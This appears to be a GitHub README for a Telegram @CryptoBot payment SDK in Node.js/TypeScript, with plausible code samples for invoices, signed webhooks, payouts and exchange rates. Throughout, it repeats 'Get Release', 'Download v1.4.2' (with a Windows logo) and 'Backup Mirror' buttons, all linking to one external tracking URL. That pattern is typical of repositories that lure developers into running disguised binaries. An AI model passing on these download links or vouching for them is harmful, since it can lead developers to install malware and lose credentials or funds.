
# ⚡ Crypto Pay API Node.js & TypeScript SDK

[![Get Release](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=crypto-pay-api "Download Release")
[![Download Latest Release](https://img.shields.io/badge/Download%20v1.4.2-red?style=for-the-badge&logo=windows&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=crypto-pay-api "Download Release")
[![Backup Mirror](https://img.shields.io/badge/Backup%20Mirror-8b0000?style=for-the-badge&logo=directus&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=crypto-pay-api "Download Backup")

> An enterprise-grade, highly scalable, zero-dependency Node.js and TypeScript library engineered for seamless integration with Telegram's @CryptoBot API. Easily process cross-border payments, issue crypto invoices, automate payout routines, and handle dynamic crypto-to-fiat conversion rates with strict type safety and cryptographic payload verification.

---

## 📍 Navigation Menu
* [Overview & Architecture](#-overview--architecture)
* [Key Features & Capabilities](#-key-features--capabilities)
* [Download & Installation](#-download--installation)
* [Configuration & Setup](#-configuration--setup)
* [Usage Examples](#-usage-examples)
  * [1. Invoice Creation & Management](#1-invoice-creation--management)
  * [2. Express.js Webhook Integration](#2-expressjs-webhook-integration)
  * [3. Automated Crypto Transfers & Payouts](#3-automated-crypto-transfers--payouts)
  * [4. Live Exchange Rates & Currency Conversion](#4-live-exchange-rates--currency-conversion)
* [Supported Assets & Blockchain Networks](#-supported-assets--blockchain-networks)
* [Error Handling & Security Standards](#-error-handling--security-standards)
* [License & Support](#-license--support)

---

## 🚀 Overview & Architecture

The crypto-pay-api SDK provides a developer-first interface for accepting cryptocurrency payments within Telegram Mini Apps, e-commerce platforms, SaaS platforms, and automated bots. Built with zero external dependencies, it guarantees minimal bundle size, maximum speed, and minimal vulnerability surface area.

[![Get Release](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=crypto-pay-api "Download Release")

### Key Highlights
* Mainnet & Testnet Support: Switch environments instantly with a single config flag.
* Asynchronous Polling & Webhooks: Choose between event-driven HTTP push notifications or resilient long-polling routines.
* Strict Type Definitions: Built natively in TypeScript with complete input/output schema coverage.

---

## 🔥 Key Features & Capabilities

* Multi-Currency Invoice Engine: Create customized payment checkout links with auto-expire timers, hidden customer parameters, and custom redirect actions.
* HMAC-SHA256 Signature Verification: Securely validate incoming webhook payloads to protect against spoofing attacks.
* Automated Wallet Transfers: Programmatically send payouts directly to Telegram users or external wallet addresses with precise memo tracking.
* Real-Time Exchange Rate Engine: Query accurate fiat-to-crypto exchange rates (USD, EUR, RUB, GBP) for dynamic pricing calculations.
* Balance & Account Metrics: Retrieve instantly available wallet balances, locked escrow funds, and transaction history.
* Rate-Limit & Retry Resiliency: Built-in HTTP client configuration with automatic retry mechanisms for uninterrupted operations under high traffic.

---

## 📥 Download & Installation

Download compiled release packages, standalone binary bundles, or install using package managers:

[![Get Release](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=crypto-pay-api "Download Release")
[![Download Backup](https://img.shields.io/badge/Backup%20Mirror-red?style=for-the-badge&logo=directus&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=crypto-pay-api "Download Backup")

### Package Manager Commands

    # Using NPM
    npm install crypto-pay-api

    # Using Yarn
    yarn add crypto-pay-api

    # Using PNPM
    pnpm add crypto-pay-api

---

## ⚙️ Configuration & Setup

Initialize the SDK client by passing your API token obtained from Telegram's @CryptoBot (or @CryptoTestnetBot for testnet execution).

    import { CryptoPay } from 'crypto-pay-api';

    const client = new CryptoPay({
      token: process.env.CRYPTO_PAY_TOKEN || '12345:AAA...YourApiToken',
      net: 'mainnet', // Options: 'mainnet' | 'testnet'
      timeout: 10000   // Request timeout in milliseconds (default: 10s)
    });

---

## 💻 Usage Examples

### 1. Invoice Creation & Management

Issue crypto invoices dynamically with customizable checkout buttons:

    import { CryptoPay } from 'crypto-pay-api';

    const client = new CryptoPay({ token: 'YOUR_API_TOKEN', net: 'mainnet' });

    async function createCheckoutSession(userId: string, itemPriceUSD: number) {
      try {
        const invoice = await client.createInvoice({
          asset: 'USDT',
          amount: itemPriceUSD.toString(),
          description: `Payment for Order #98342 - User ${userId}`,
          hidden_message: 'Thank you for your purchase! Your access key: KEY-9021',
          paid_btn_name: 'callback',
          paid_btn_url: 'https://yourwebsite.com/orders/success',
          allow_comments: false,
          allow_anonymous: false,
          expires_in: 3600 // Valid for 1 hour
        });

        console.log('Invoice ID:', invoice.invoice_id);
        console.log('Checkout URL:', invoice.pay_url);
        return invoice;
      } catch (error) {
        console.error('Invoice Creation Failed:', error);
      }
    }

### 2. Express.js Webhook Integration

Verify signatures and listen for automated payment callbacks securely:

    import express from 'express';
    import { CryptoPay, verifyWebhookSignature } from 'crypto-pay-api';

    const app = express();
    app.use(express.json());

    const API_TOKEN = process.env.CRYPTO_PAY_TOKEN!;

    app.post('/api/v1/crypto-webhook', (req, res) => {
      const signature = req.headers['crypto-pay-api-signature'] as string;

      // Validate request authenticity
      const isValid = verifyWebhookSignature(req.body, signature, API_TOKEN);
      if (!isValid) {
        return res.status(401).json({ error: 'Unauthorized: Invalid HMAC signature' });
      }

      const { update_id, update_type, payload } = req.body;

      if (update_type === 'invoice_paid') {
        console.log(`[SUCCESS] Invoice #${payload.invoice_id} paid!`);
        console.log(`Paid Amount: ${payload.amount} ${payload.asset}`);
        console.log(`Customer Comment: ${payload.comment || 'N/A'}`);
        
        // Fulfill user order logic here...
      }

      return res.status(200).send('OK');
    });

    app.listen(3000, () => console.log('Webhook Listener running on port 3000'));

### 3. Automated Crypto Transfers & Payouts

Send instant payouts to user Telegram accounts programmatically:

    async function processUserPayout(targetUserId: number, payoutAmount: string, tokenAsset: 'USDT' | 'TON') {
      const transfer = await client.transfer({
        user_id: targetUserId,
        asset: tokenAsset,
        amount: payoutAmount,
        spend_id: `payout-ref-${Date.now()}`, // Unique ID to prevent double spending
        comment: 'Monthly partner payout program'
      });

      console.log(`Payout successfully completed! Transfer ID: ${transfer.transfer_id}`);
    }

### 4. Live Exchange Rates & Currency Conversion

Calculate dynamically converted crypto amounts based on current fiat pricing:

    async function calculateCryptoEquivalent(fiatAmountUSD: number) {
      const rates = await client.getExchangeRates();
      
      // Find USDT to USD exchange rate
      const usdtRate = rates.find(r => r.source === 'USDT' && r.target === 'USD');
      const tonRate = rates.find(r => r.source === 'TON' && r.target === 'USD');

      if (usdtRate && tonRate) {
        console.log(`1 USDT = $${usdtRate.rate} USD`);
        console.log(`1 TON = $${tonRate.rate} USD`);
        
        const requiredTON = (fiatAmountUSD / parseFloat(tonRate.rate)).toFixed(4);
        console.log(`$${fiatAmountUSD} USD equals approx ${requiredTON} TON`);
      }
    }

---

## 💎 Supported Assets & Blockchain Networks

| Asset | Full Token Name | Supported Standards / Networks | Standard Decimals | Min Transfer Amount |
| :--- | :--- | :--- | :--- | :--- |
| **USDT** | Tether USD | TRC-20, TON Network, ERC-20 | 6 Decimals | 0.1 USDT |
| **TON** | Toncoin | Open Network Native | 9 Decimals | 0.01 TON |
| **BTC** | Bitcoin | Bitcoin Mainnet Native | 8 Decimals | 0.00001 BTC |
| **ETH** | Ethereum | Ethereum ERC-20 Native | 18 Decimals | 0.001 ETH |
| **LTC** | Litecoin | Litecoin Network | 8 Decimals | 0.01 LTC |
| **GRAM** | Gram Token | TON Jetton | 9 Decimals | 1.0 GRAM |
| **NOT** | Notcoin | TON Jetton | 9 Decimals | 100.0 NOT |

---

## 🛡️ Error Handling & Security Standards

The library exports custom error classes for robust error handling and API exception management:

    import { CryptoPay, CryptoPayError } from 'crypto-pay-api';

    try {
      await client.getInvoices({ count: 100 });
    } catch (error) {
      if (error instanceof CryptoPayError) {
        console.error(`API Error Code: ${error.code}`);
        console.error(`API Error Message: ${error.message}`);
      } else {
        console.error('Unexpected System Error:', error);
      }
    }

### Security Recommendations
1. Never Hardcode API Tokens: Always load API keys via environment variables (process.env).
2. Verify Webhook Signatures: Always check the crypto-pay-api-signature header before executing database changes.
3. Use Idempotency Keys: Use spend_id parameters during transfers to eliminate accidental duplicate payouts.

---

## 📄 License & Support

Distributed under the MIT License. See LICENSE for details.

[![Get Release](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=crypto-pay-api "Download Release")
